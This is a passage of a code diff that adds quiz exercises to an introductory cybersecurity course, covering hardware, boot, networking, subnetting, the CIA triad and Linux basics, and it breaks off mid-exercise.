@@ -199,6 +199,47 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m0-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each memory/OS concept to its defining property.",
+            "pairs": [
+              {
+                "left": "RAM (volatile)",
+                "right": "Holds data in use; wiped on power-off"
+              },
+              {
+                "left": "ROM / EEPROM (non-volatile)",
+                "right": "Retains BIOS/UEFI firmware without power"
+              },
+              {
+                "left": "Swapping",
+                "right": "Moves inactive processes between RAM and disk"
+              },
+              {
+                "left": "Page fault",
+                "right": "Access to data that was swapped out of RAM"
+              },
+              {
+                "left": "Thrashing",
+                "right": "More time spent paging than executing work"
+              }
+            ],
+            "explanation": "RAM is volatile and loses contents on power-off, while ROM/EEPROM persists firmware; swapping, page faults, and thrashing describe how the OS stretches limited RAM onto disk."
+          },
+          {
+            "type": "order",
+            "prompt": "Put these events in order, from RAM filling up to the data being restored.",
+            "items": [
+              "RAM fills with active processes",
+              "OS swaps an inactive process out to disk",
+              "Program later accesses the swapped-out data",
+              "A page fault occurs",
+              "OS swaps the data back into RAM"
+            ],
+            "explanation": "When RAM is exhausted the OS swaps inactive data to disk; a later access to that data isn't in physical memory, triggering a page fault that forces a swap-in."
+          }
+        ],
         moduleId: "m0",
         number: 2,
         title: "RAM vs ROM — Volatile vs Non-Volatile Memory",
@@ -337,6 +378,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m0-3",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each storage/device term to its distinguishing characteristic.",
+            "pairs": [
+              {
+                "left": "HDD",
+                "right": "Spinning magnetic platters; cheapest per GB"
+              },
+              {
+                "left": "SSD",
+                "right": "Flash chips, no moving parts; uses TRIM/wear-levelling"
+              },
+              {
+                "left": "NVMe",
+                "right": "SSD connected over PCIe; highest throughput"
+              },
+              {
+                "left": "Block device",
+                "right": "Transfers fixed-size chunks (e.g. 512B/4KB)"
+              },
+              {
+                "left": "Character device",
+                "right": "Streams one byte at a time (keyboard/mouse)"
+              }
+            ],
+            "explanation": "HDD, SSD, and NVMe trade cost for speed, and all are block devices that move fixed-size chunks, unlike character devices such as keyboards that stream byte-by-byte."
+          },
+          {
+            "type": "order",
+            "prompt": "Order these storage types from slowest to fastest throughput.",
+            "items": [
+              "HDD (magnetic platters)",
+              "SSD (flash over SATA)",
+              "NVMe (flash over PCIe)"
+            ],
+            "explanation": "Moving from spinning platters to flash, then from the SATA bus to a direct PCIe connection, each step sharply raises throughput and lowers latency."
+          }
+        ],
         moduleId: "m0",
         number: 3,
         title: "Storage Types: HDD, SSD, NVMe",
@@ -457,6 +537,50 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m0-4",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each component or firmware feature to its description.",
+            "pairs": [
+              {
+                "left": "BIOS",
+                "right": "MBR partitioning, ~2TB max, text-only interface"
+              },
+              {
+                "left": "UEFI",
+                "right": "GPT partitioning, >2TB, Secure Boot support"
+              },
+              {
+                "left": "GPU",
+                "right": "Parallel processor; used by Hashcat to crack passwords"
+              },
+              {
+                "left": "Motherboard",
+                "right": "Connects CPU, RAM, and storage via buses"
+              },
+              {
+                "left": "POST",
+                "right": "Power-on self-test of hardware before the boot loader"
+              }
+            ],
+            "explanation": "UEFI is the modern replacement for legacy BIOS (GPT vs MBR, Secure Boot), while the GPU, motherboard, and POST each play distinct roles in the hardware stack and boot."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the firmware-setup fact.",
+            "template": "On HP systems the setup-entry key is commonly ___ , and Secure Boot blocks ___ bootloader code to stop bootkits.",
+            "blanks": [
+              "F10",
+              "unsigned"
+            ],
+            "explanation": "HP machines typically use F10 to enter firmware setup, and Secure Boot refuses to run unsigned bootloaders so malware can't persist through a reimage.",
+            "distractors": [
+              "F12",
+              "signed",
+              "F1"
+            ]
+          }
+        ],
         moduleId: "m0",
         number: 4,
         title: "GPU, Motherboard, BIOS/UEFI Explained",
@@ -633,6 +757,34 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m0-5",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the boot hand-off chain from power-on to user mode.",
+            "items": [
+              "POST checks hardware",
+              "BIOS/UEFI reads the MBR/GPT",
+              "Boot loader loads and decompresses the kernel",
+              "Kernel mounts the root filesystem",
+              "Kernel starts the init process (PID 1)"
+            ],
+            "explanation": "Boot is a strict hand-off: firmware self-tests and reads the partition table, the boot loader loads the kernel, and the kernel mounts root then starts init (PID 1), crossing into user mode."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the boot-repair commands.",
+            "template": "After editing /etc/default/grub, run `sudo ___` to apply it; repair a corrupted Windows MBR with `bootrec ___`.",
+            "blanks": [
+              "update-grub",
+              "/fixmbr"
+            ],
+            "explanation": "GRUB changes only take effect after update-grub regenerates its config, and on Windows bootrec /fixmbr repairs a corrupted Master Boot Record (while /rebuildbcd rebuilds the Boot Configuration Data).",
+            "distractors": [
+              "/rebuildbcd",
+              "/fixboot"
+            ]
+          }
+        ],
         moduleId: "m0",
         number: 5,
         title: "How hardware components interact at boot time",
@@ -847,6 +999,41 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m1-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each vending-machine attack to the mitigation that stops it.",
+            "pairs": [
+              {
+                "left": "Reaching through the dispenser gap",
+                "right": "Close the dispenser path once it is opened"
+              },
+              {
+                "left": "Feeding in fake coins",
+                "right": "Validate the money that is inserted"
+              },
+              {
+                "left": "Breaking the glass to grab items",
+                "right": "Physical security responds to the break-in"
+              }
+            ],
+            "explanation": "Every attack (an action the creator never intended) has a matching mitigation; the attacker carrying it out is the 'adversary'."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the core definition of cybersecurity.",
+            "template": "The person carrying out an attack is called an ___, and cybersecurity protects systems while ensuring the ___, integrity, and availability of digital assets.",
+            "blanks": [
+              "adversary",
+              "confidentiality"
+            ],
+            "explanation": "'Adversary' is the term for whoever you defend against, and the CIA triad (confidentiality, integrity, availability) defines what security protects.",
+            "distractors": [
+              "auditor",
+              "accountability"
+            ]
+          }
+        ],
         moduleId: "m1",
         number: 6,
         title: "What is Cybersecurity and Why It Matters",
@@ -963,6 +1150,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m1-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each CIA principle to its vending-machine example.",
+            "pairs": [
+              {
+                "left": "Confidentiality",
+                "right": "Protect the key that opens the machine"
+              },
+              {
+                "left": "Integrity",
+                "right": "An MRP of 20 must always read 20"
+              },
+              {
+                "left": "Availability",
+                "right": "You can actually buy something from it"
+              }
+            ],
+            "explanation": "Confidentiality limits access, integrity keeps data accurate, and availability keeps the service usable; the three work together."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in which CIA property each control protects.",
+            "template": "Encrypting a file protects ___, hashing verifies ___, and backups ensure ___.",
+            "blanks": [
+              "confidentiality",
+              "integrity",
+              "availability"
+            ],
+            "explanation": "No single control covers all three: encryption guards confidentiality, hashing proves integrity, and backups preserve availability.",
+            "distractors": [
+              "authentication",
+              "authorization"
+            ]
+          }
+        ],
         moduleId: "m1",
         number: 7,
         title: "CIA Triad (Confidentiality, Integrity, Availability)",
@@ -1072,6 +1295,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m1-3",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put an offensive-then-defensive engagement in the correct order.",
+            "items": [
+              "Hire someone, with permission, to try to break the system",
+              "The tester finds vulnerabilities",
+              "Build mitigations from whatever they find",
+              "Defensive team patches what was broken to prevent future breaches"
+            ],
+            "explanation": "Offensive security simulates attacks to surface vulnerabilities; defensive security picks up from those findings and patches proactively."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each cybersecurity domain to an example of its work.",
+            "pairs": [
+              {
+                "left": "Application Security",
+                "right": "SAST and DAST testing of code"
+              },
+              {
+                "left": "Network Security",
+                "right": "Firewalls and IDS/IPS"
+              },
+              {
+                "left": "Cloud Security",
+                "right": "Securing AWS, Azure, and GCP"
+              },
+              {
+                "left": "Incident Response",
+                "right": "Forensic analysis and log review"
+              }
+            ],
+            "explanation": "Each domain has a distinct focus area, from secure coding to network defenses to responding after an incident."
+          }
+        ],
         moduleId: "m1",
         number: 8,
         title: "Types of Cybersecurity Domains (Offensive, Defensive, GRC)",
@@ -1265,6 +1524,41 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m1-4",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each threat category to its description.",
+            "pairs": [
+              {
+                "left": "Malware",
+                "right": "Software that damages or gains unauthorized access"
+              },
+              {
+                "left": "Phishing",
+                "right": "Deceptive messages that trick users into revealing credentials"
+              },
+              {
+                "left": "Ransomware",
+                "right": "Encrypts victim data and demands payment for the key"
+              }
+            ],
+            "explanation": "At this stage these are introduced only as a category name-check; each gets a dedicated deep dive in later modules."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Name the threat type for each description.",
+            "template": "___ encrypts a victim's data and demands payment, while ___ uses deceptive messages to steal credentials.",
+            "blanks": [
+              "Ransomware",
+              "Phishing"
+            ],
+            "explanation": "Ransomware extorts via encryption; phishing manipulates people into handing over credentials or installing malware.",
+            "distractors": [
+              "Spyware",
+              "A worm"
+            ]
+          }
+        ],
         moduleId: "m1",
         number: 9,
         title:
@@ -1359,6 +1653,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m1-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each security term to its meaning.",
+            "pairs": [
+              {
+                "left": "Vulnerability",
+                "right": "A weakness in a system that could be exploited"
+              },
+              {
+                "left": "Exploit",
+                "right": "Code or technique that takes advantage of a weakness"
+              },
+              {
+                "left": "Patch",
+                "right": "Vendor fix that closes a vulnerability"
+              },
+              {
+                "left": "Zero-day",
+                "right": "A vulnerability unknown or unpatched while being used"
+              }
+            ],
+            "explanation": "These build on each other: a vulnerability is a weakness, an exploit abuses it, a patch closes it, and a zero-day is one with no fix available yet."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Distinguish CVE from CWE.",
+            "template": "A ___ identifies a specific known vulnerability, while a ___ identifies the class or root-cause weakness behind it.",
+            "blanks": [
+              "CVE",
+              "CWE"
+            ],
+            "explanation": "CVE points to one concrete known vulnerability; CWE names the underlying weakness type, and IOC/APT describe compromise evidence and long-term campaigns.",
+            "distractors": [
+              "IOC",
+              "APT"
+            ]
+          }
+        ],
         moduleId: "m1",
         number: 10,
         title: "Key Terms: CVE, CWE, IOC, APT, Zero-Day, Threat Actor, TTP",
@@ -1478,6 +1811,38 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m1-6",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of an authorized, responsibly-disclosed engagement.",
+            "items": [
+              "Obtain written authorization (Rules of Engagement)",
+              "Test only the agreed in-scope systems",
+              "Report the vulnerability privately to the vendor or owner",
+              "Allow a fix before any public disclosure"
+            ],
+            "explanation": "Permission comes first, testing stays in scope, and disclosure goes to the owner before the public so a fix can land."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each ethical/legal concept to its meaning.",
+            "pairs": [
+              {
+                "left": "Written authorization",
+                "right": "Permission required before testing systems you don't own"
+              },
+              {
+                "left": "Responsible disclosure",
+                "right": "Report to the owner before going public"
+              },
+              {
+                "left": "Lab environments",
+                "right": "TryHackMe, HackTheBox, DVWA for safe practice"
+              }
+            ],
+            "explanation": "The operating rule is 'get permission first': practice only on systems you own or on sanctioned labs, and disclose responsibly."
+          }
+        ],
         moduleId: "m1",
         number: 11,
         title:
@@ -1602,6 +1967,47 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m2-1",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Arrange the OSI layers in the order data flows down the stack as it is sent, using the module's postal analogy.",
+            "items": [
+              "Application — write the message",
+              "Presentation — put it in an envelope",
+              "Session — assign a tracking number",
+              "Transport — split into packages if too big",
+              "Network — pick the fastest route"
+            ],
+            "explanation": "Data moves top-down from Application (L7) toward Physical (L1) as it is sent; the postal analogy maps each layer to a step in mailing a letter."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each OSI layer to the job it performs.",
+            "pairs": [
+              {
+                "left": "L7 Application",
+                "right": "Interface between user apps and the network"
+              },
+              {
+                "left": "L4 Transport",
+                "right": "Segments data and retransmits lost pieces"
+              },
+              {
+                "left": "L3 Network",
+                "right": "Routes packets across networks using IP"
+              },
+              {
+                "left": "L2 Data Link",
+                "right": "Node-to-node delivery using MAC addresses"
+              },
+              {
+                "left": "L1 Physical",
+                "right": "Raw bits over cable, fiber, or radio"
+              }
+            ],
+            "explanation": "Each OSI layer has a distinct responsibility: higher layers deal with the meaning of data, lower layers with delivery and signaling."
+          }
+        ],
         moduleId: "m2",
         number: 12,
         title: "OSI Model — All 7 Layers Explained",
@@ -1746,6 +2152,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-2",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the four TCP/IP layers from top to bottom, the direction data is encapsulated as it is sent.",
+            "items": [
+              "Application (HTTP/FTP/SMTP)",
+              "Transport (TCP/UDP)",
+              "Internet (IP/ICMP)",
+              "Network Access (Ethernet/Wi-Fi)"
+            ],
+            "explanation": "TCP/IP's 4 layers run the real internet; data is wrapped from Application down to Network Access before it hits the wire."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the two protocols that divide the work of sending data.",
+            "template": "___ breaks data into packets and adds sequencing headers, while ___ wraps them with source and destination addresses and routes them.",
+            "blanks": [
+              "TCP",
+              "IP"
+            ],
+            "explanation": "TCP handles reliable, ordered delivery; IP handles the addressing and routing of packets across networks.",
+            "distractors": [
+              "UDP",
+              "ICMP"
+            ]
+          }
+        ],
         moduleId: "m2",
         number: 13,
         title: "TCP/IP Model",
@@ -1913,6 +2346,49 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-3",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the address counts for a /24 network.",
+            "template": "A CIDR /24 (255.255.255.0) contains ___ total addresses, of which ___ are usable after reserving the network and broadcast addresses.",
+            "blanks": [
+              "256",
+              "254"
+            ],
+            "explanation": "A /24 has 8 host bits (2^8 = 256 addresses); subtracting the reserved network and broadcast addresses leaves 254 usable hosts.",
+            "distractors": [
+              "255",
+              "128"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each addressing term to its definition.",
+            "pairs": [
+              {
+                "left": "IPv4",
+                "right": "32-bit address, ~4.3 billion total"
+              },
+              {
+                "left": "IPv6",
+                "right": "128-bit hex address, solves exhaustion"
+              },
+              {
+                "left": "Static IP",
+                "right": "Manually assigned, never changes"
+              },
+              {
+                "left": "Dynamic IP",
+                "right": "Auto-assigned by DHCP, can change"
+              },
+              {
+                "left": "Private IP",
+                "right": "Internal-only, translated by NAT"
+              }
+            ],
+            "explanation": "IPv4 and IPv6 differ in size; static vs dynamic differ in how they are assigned; private addresses are translated to a public one via NAT."
+          }
+        ],
         moduleId: "m2",
         number: 14,
         title: "IP Addressing (IPv4, IPv6) & Subnetting",
@@ -2095,6 +2571,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-4",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each port number to its service.",
+            "pairs": [
+              {
+                "left": "53",
+                "right": "DNS"
+              },
+              {
+                "left": "22",
+                "right": "SSH"
+              },
+              {
+                "left": "21",
+                "right": "FTP"
+              },
+              {
+                "left": "25",
+                "right": "SMTP"
+              },
+              {
+                "left": "3389",
+                "right": "RDP"
+              }
+            ],
+            "explanation": "An IP plus a port number forms a socket; each well-known port identifies one specific service to connect to."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the two mail-retrieval protocols.",
+            "template": "___ synchronizes email across every device, while ___ downloads mail to one device and by default deletes it from the server.",
+            "blanks": [
+              "IMAP",
+              "POP3"
+            ],
+            "explanation": "IMAP keeps mail in sync across devices; POP3 pulls mail down to a single device and removes it from the server.",
+            "distractors": [
+              "SMTP"
+            ]
+          }
+        ],
         moduleId: "m2",
         number: 15,
         title: "Ports & Common Protocols (DNS, HTTP/S, FTP, SSH, SMTP, RDP)",
@@ -2230,6 +2748,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-5",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of the ARP resolution process when a device needs a MAC for a known IP.",
+            "items": [
+              "Check the local ARP cache",
+              "Broadcast an ARP Request ('who has this IP?')",
+              "Owning device replies via unicast with its MAC",
+              "Requester updates its ARP cache"
+            ],
+            "explanation": "ARP resolves a known IP to its MAC by broadcasting a request and caching the unicast reply for future frames."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each ARP type to its description.",
+            "pairs": [
+              {
+                "left": "Dynamic ARP",
+                "right": "Auto-resolved and temporary"
+              },
+              {
+                "left": "Static ARP",
+                "right": "Manually configured, never expires"
+              },
+              {
+                "left": "Proxy ARP",
+                "right": "A router answers on another device's behalf"
+              },
+              {
+                "left": "Gratuitous ARP",
+                "right": "Announces a MAC to detect IP conflicts"
+              }
+            ],
+            "explanation": "ARP comes in several forms; gratuitous ARP in particular announces or updates a mapping and helps spot IP conflicts."
+          }
+        ],
         moduleId: "m2",
         number: 16,
         title: "MAC Address & ARP",
@@ -2381,6 +2935,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-6",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the messages of the TCP 3-way handshake that opens a connection.",
+            "items": [
+              "SYN",
+              "SYN-ACK",
+              "ACK"
+            ],
+            "explanation": "TCP opens every connection with SYN, SYN-ACK, ACK before any data is sent, establishing agreed sequence numbers."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in how each transport protocol starts a conversation.",
+            "template": "TCP establishes a connection with a ___ handshake before data flows, while UDP sends independent ___ with no connection setup.",
+            "blanks": [
+              "three-way",
+              "datagrams"
+            ],
+            "explanation": "TCP's three-way handshake sets up a reliable connection; UDP just fires off datagrams with no handshake or retransmission.",
+            "distractors": [
+              "four-way",
+              "segments"
+            ]
+          }
+        ],
         moduleId: "m2",
         number: 17,
         title: "TCP vs UDP — Differences & Use Cases",
@@ -2534,6 +3114,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-7",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each network device to its behavior and layer.",
+            "pairs": [
+              {
+                "left": "Hub (L1)",
+                "right": "Broadcasts every frame to all ports"
+              },
+              {
+                "left": "Switch (L2)",
+                "right": "Forwards frames by MAC to the intended port"
+              },
+              {
+                "left": "Router (L3)",
+                "right": "Connects separate networks using IP"
+              }
+            ],
+            "explanation": "Intelligence rises from hub to switch to router; only the router works across separate networks using IP addresses."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the two devices by their defining behavior.",
+            "template": "A ___ learns which MAC address sits on each port, while a ___ connects separate networks and needs at least two networks to function.",
+            "blanks": [
+              "switch",
+              "router"
+            ],
+            "explanation": "A switch forwards by learned MAC addresses within one network; a router's whole purpose is joining two or more separate networks.",
+            "distractors": [
+              "hub"
+            ]
+          }
+        ],
         moduleId: "m2",
         number: 18,
         title: "Switches, Routers, Hubs - Differences",
@@ -2665,6 +3279,47 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-8",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order these firewall types from least to most sophisticated, as the module presents them.",
+            "items": [
+              "Packet-Filtering Firewall",
+              "Stateful Inspection Firewall",
+              "Proxy / Application-Layer Firewall",
+              "Next-Generation Firewall (NGFW)",
+              "Cloud-Based Firewall"
+            ],
+            "explanation": "The module walks from basic packet filtering up through stateful and proxy firewalls to NGFW and cloud-hosted firewalls."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each firewall type to its defining trait.",
+            "pairs": [
+              {
+                "left": "Packet-Filtering",
+                "right": "Inspects only IP, port, and protocol"
+              },
+              {
+                "left": "Stateful Inspection",
+                "right": "Tracks a session table of active connections"
+              },
+              {
+                "left": "Proxy / Application-Layer",
+                "right": "Intermediary that masks internal IPs at L7"
+              },
+              {
+                "left": "NGFW",
+                "right": "Deep packet inspection plus intrusion prevention"
+              },
+              {
+                "left": "Cloud-Based",
+                "right": "Hosted and scales elastically for cloud apps"
+              }
+            ],
+            "explanation": "Each firewall type inspects traffic at a different depth, from header-only packet filtering up to NGFW's deep inspection."
+          }
+        ],
         moduleId: "m2",
         number: 19,
         title: "Firewall Basics (packet filter, stateful, NGFW)",
@@ -2812,6 +3467,47 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-9",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of how a VPN handles your traffic, per the module.",
+            "items": [
+              "You connect to a VPN server",
+              "The VPN encrypts your traffic",
+              "The encrypted data travels the internet securely",
+              "The VPN server forwards the request to the destination",
+              "The response returns through the same secure tunnel"
+            ],
+            "explanation": "A VPN encrypts your whole connection and tunnels it through its server, hiding traffic from your ISP and attackers alike."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each proxy type to its characteristic.",
+            "pairs": [
+              {
+                "left": "HTTP proxy",
+                "right": "No encryption"
+              },
+              {
+                "left": "SOCKS proxy",
+                "right": "Handles any traffic type"
+              },
+              {
+                "left": "Reverse proxy",
+                "right": "Protects and load-balances servers"
+              },
+              {
+                "left": "Transparent proxy",
+                "right": "Workplace filtering without user awareness"
+              },
+              {
+                "left": "Elite proxy",
+                "right": "Fully masks both IP and proxy use"
+              }
+            ],
+            "explanation": "Proxy types differ in what they encrypt and hide; unlike a VPN, a basic proxy forwards requests without encrypting them."
+          }
+        ],
         moduleId: "m2",
         number: 20,
         title: "VPN & Proxies",
@@ -2952,6 +3648,41 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-10",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each NAT type to its behavior.",
+            "pairs": [
+              {
+                "left": "Static NAT",
+                "right": "Fixed one-to-one IP mapping"
+              },
+              {
+                "left": "Dynamic NAT",
+                "right": "Maps to a free IP from a pool"
+              },
+              {
+                "left": "PAT (overloading)",
+                "right": "Many private IPs share one public IP by port"
+              }
+            ],
+            "explanation": "NAT translates private addresses to public ones; PAT is what a home router uses so every device shares one public IP."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in how PAT lets many devices share one public IP.",
+            "template": "PAT, also called ___, lets many private IPs share one public IP, distinguished only by ___ number.",
+            "blanks": [
+              "overloading",
+              "port"
+            ],
+            "explanation": "PAT (overloading) multiplexes many internal devices onto one public IP, tracking each conversation by its port number.",
+            "distractors": [
+              "static NAT",
+              "MAC"
+            ]
+          }
+        ],
         moduleId: "m2",
         number: 21,
         title: "NAT (Network Address Translation)",
@@ -3097,6 +3828,34 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-11",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order what happens after you type a URL and hit Enter.",
+            "items": [
+              "DNS resolves the domain to an IP",
+              "TCP 3-way handshake opens the connection",
+              "TLS handshake negotiates encryption (HTTPS)",
+              "Browser sends the HTTP request",
+              "Server returns the HTTP response"
+            ],
+            "explanation": "The full flow chains DNS resolution, the TCP handshake, the TLS handshake, then the HTTP request/response exchange."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the TLS handshake key-exchange steps.",
+            "template": "In the TLS handshake the browser verifies the server's ___ via PKI, encrypts a session key with the server's ___ key, and the server decrypts it with its ___ key.",
+            "blanks": [
+              "certificate",
+              "public",
+              "private"
+            ],
+            "explanation": "TLS uses the server's certificate and its public/private key pair to safely agree on a shared session key for all later traffic.",
+            "distractors": [
+              "session"
+            ]
+          }
+        ],
         moduleId: "m2",
         number: 22,
         title: "What Happens When You Type a URL and Hit Enter (full flow)",
@@ -3244,6 +4003,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-12",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each captured traffic pattern to what it represents.",
+            "pairs": [
+              {
+                "left": "ARP broadcast then unicast reply",
+                "right": "'Who has this IP?' resolution"
+              },
+              {
+                "left": "SYN / SYN-ACK / ACK",
+                "right": "TCP connection setup"
+              },
+              {
+                "left": "HTTP GET then 200 OK",
+                "right": "Application-layer request/response"
+              },
+              {
+                "left": "DNS query then response",
+                "right": "Domain resolved to an IP"
+              },
+              {
+                "left": "Follow TCP Stream",
+                "right": "Full request/response conversation"
+              }
+            ],
+            "explanation": "Recognizing these patterns in Wireshark lets you identify real protocol behavior at each OSI layer, not just filter syntax."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in which captured traffic is readable versus encrypted.",
+            "template": "In a capture, ___ and HTTP traffic appear in readable plaintext, while ___ traffic is encrypted.",
+            "blanks": [
+              "FTP",
+              "HTTPS"
+            ],
+            "explanation": "FTP and HTTP send data in the clear, so anyone sniffing can read it; HTTPS encrypts the payload.",
+            "distractors": [
+              "ARP"
+            ]
+          }
+        ],
         moduleId: "m2",
         number: 23,
         title: "Wireshark Lab - Capture & Label Traffic by OSI Layer",
@@ -3404,6 +4205,47 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m2-13",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the subnet math for a /26 block.",
+            "template": "For a /26, host bits = 32 - 26 = ___ , giving ___ total addresses and ___ usable hosts per subnet.",
+            "blanks": [
+              "6",
+              "64",
+              "62"
+            ],
+            "explanation": "A /26 leaves 6 host bits (2^6 = 64 addresses); reserving the network and broadcast addresses leaves 62 usable hosts.",
+            "distractors": [
+              "5",
+              "32",
+              "30"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each /26 subnet of 192.168.1.0/24 to its usable host range.",
+            "pairs": [
+              {
+                "left": "192.168.1.0/26",
+                "right": "hosts .1–.62"
+              },
+              {
+                "left": "192.168.1.64/26",
+                "right": "hosts .65–.126"
+              },
+              {
+                "left": "192.168.1.128/26",
+                "right": "hosts .129–.190"
+              },
+              {
+                "left": "192.168.1.192/26",
+                "right": "hosts .193–.254"
+              }
+            ],
+            "explanation": "Splitting a /24 into /26 blocks of 64 addresses each yields four subnets, each with 62 usable hosts between its reserved ends."
+          }
+        ],
         moduleId: "m2",
         number: 24,
         title: "Subnetting Practice Exercise (5 CIDRs)",
@@ -3573,6 +4415,45 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m3-linux-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each Linux distro to what it is known for.",
+            "pairs": [
+              {
+                "left": "Kali",
+                "right": "Pentesting distro with preinstalled offensive tools"
+              },
+              {
+                "left": "Mint",
+                "right": "Lightweight, beginner-friendly, good on old hardware"
+              },
+              {
+                "left": "Ubuntu",
+                "right": "Debian-derived, server- and beginner-friendly"
+              },
+              {
+                "left": "Arch",
+                "right": "Minimal, customisable down to the bootloader"
+              }
+            ],
+            "explanation": "A distro is kernel + software + package manager; all share the Linux kernel but differ in bundled tooling and philosophy."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the facts about Linux's origin.",
+            "template": "Linux was created by ___ and first released in ___.",
+            "blanks": [
+              "Linus Torvalds",
+              "1991"
+            ],
+            "explanation": "Linus Torvalds released the Linux kernel on 17 September 1991 because no free, working kernel existed for the GNU project.",
+            "distractors": [
+              "Richard Stallman",
+              "1998"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 25,
         title: "Linux Overview - Distros, Philosophy, Use in Security",
@@ -3755,6 +4636,49 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each top-level directory to its purpose.",
+            "pairs": [
+              {
+                "left": "/bin",
+                "right": "System binaries such as bash, ls, cat"
+              },
+              {
+                "left": "/etc",
+                "right": "Config files and system databases"
+              },
+              {
+                "left": "/home",
+                "right": "User home directories"
+              },
+              {
+                "left": "/var",
+                "right": "Variable data such as logs"
+              },
+              {
+                "left": "/tmp",
+                "right": "Temporary files, often cleared on reboot"
+              }
+            ],
+            "explanation": "Linux uses one rooted tree (/) where each directory has a well-defined, standard purpose that tooling and permissions assume."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Name the directories by their role.",
+            "template": "Log and other frequently-changing data live in ___, while temporary files often cleared on reboot live in ___.",
+            "blanks": [
+              "/var",
+              "/tmp"
+            ],
+            "explanation": "/var holds variable data like logs; /tmp holds short-lived temporary files that are typically wiped on reboot.",
+            "distractors": [
+              "/opt",
+              "/srv"
+            ]
+          }
+        ],
         moduleId: "m3-linux",
         number: 26,
         title: "Linux File System Hierarchy (/bin, /etc, /var, /home, /tmp)",
@@ -3912,6 +4836,49 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m3-linux-3",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete these core navigation and management commands.",
+            "template": "Print the current working directory with ___, and delete a directory with everything inside it using ___ -r.",
+            "blanks": [
+              "pwd",
+              "rm"
+            ],
+            "explanation": "pwd shows where you are when the prompt doesn't; rm -r removes a directory and its contents recursively.",
+            "distractors": [
+              "cwd",
+              "del"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each command to what it does.",
+            "pairs": [
+              {
+                "left": "ls",
+                "right": "List directory contents"
+              },
+              {
+                "left": "cd ..",
+                "right": "Move up one level to the parent"
+              },
+              {
+                "left": "touch",
+                "right": "Create an empty file / update its timestamp"
+              },
+              {
+                "left": "find",
+                "right": "Search the live filesystem by criteria"
